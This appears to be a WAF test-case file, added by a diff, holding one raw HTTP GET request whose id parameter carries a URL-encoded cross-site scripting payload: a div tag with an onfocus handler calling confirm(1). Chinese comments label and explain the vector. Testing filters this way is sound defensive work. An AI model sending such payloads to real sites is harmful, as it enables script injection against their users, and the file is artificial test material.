@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_div-06506793
+# 攻击载荷利用了HTML中的div标签和onfocus属性，触发confirm()函数，显示一个确认框。style="display:table" 是一个CSS内联样式属性，它将该<div>元素的显示样式设置为table，这将使该元素以表格的形式显示。
+GET /?id=%3Cdiv%20onfocus=%22confirm%281%29%22%20id=%22xss%22%20style=%22display:table%22%3E&bid=hd_tag_m8mv25aq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25aq
+RM-PRO-Token: c85d55a8b7700f4964cbeb4753b27ced
+RM-PRO-Time: 1742808456289
+User-Agent: curl/7.83.1
+
